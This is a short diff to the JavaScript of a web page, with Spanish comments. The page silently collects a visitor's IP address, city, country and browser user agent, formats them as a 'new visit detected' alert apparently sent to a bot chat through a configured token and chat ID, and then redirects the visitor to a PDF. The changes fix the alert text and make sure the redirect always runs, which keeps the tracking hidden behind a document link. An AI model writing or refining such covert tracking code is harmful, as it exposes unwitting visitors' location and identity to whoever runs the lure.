@@ -7,7 +7,8 @@
             const d = await res.json();
             const agente = navigator.userAgent;
 
-            // Ahora usamos CONFIG.TOKEN y CONFIG.CHAT_ID
+            // CORRECCIÓN AQUÍ: Se añade el "$" antes de {d.latitude}
+            // Y se usa la URL estándar de Google Maps
             const texto = `🔔 *NUEVA VISITA DETECTADA*\n\n` +
                           `🌐 *IP:* \`${d.ip}\`\n` +
                           `📍 *Ubicación:* ${d.city}, ${d.country_name}\n` +
@@ -24,8 +25,9 @@
                 })
             });
         } catch (err) {
-            console.log("...");
+            console.log("Error en el rastreo");
         } finally {
+            // Se asegura de que la redirección ocurra incluso si falla el fetch
             window.location.href = CONFIG.PDF_URL;
         }
     }
